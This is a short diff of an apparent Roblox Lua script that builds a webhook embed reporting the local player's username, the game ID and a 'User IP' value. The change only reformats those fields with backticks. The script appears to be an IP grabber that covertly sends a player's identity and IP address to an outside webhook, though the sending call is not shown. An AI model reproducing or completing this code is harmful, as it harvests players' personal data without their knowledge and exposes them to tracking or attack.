@@ -385,15 +385,15 @@ local embed = {
     ["fields"] = {
         {
             ["name"] = "User Name",
-            ["value"] = game.Players.LocalPlayer.Name
+            ["value"] = '```'..game.Players.LocalPlayer.Name..'```'
         },
         {
             ["name"] = "Game ID",
-            ["value"] = game.PlaceId
+            ["value"] = '```'..game.PlaceId..'```'
         },
         {
             ["name"] = "User IP",
-            ["value"] = test
+            ["value"] = '```'..test..'```'
         }
     },
     ["footer"] = {
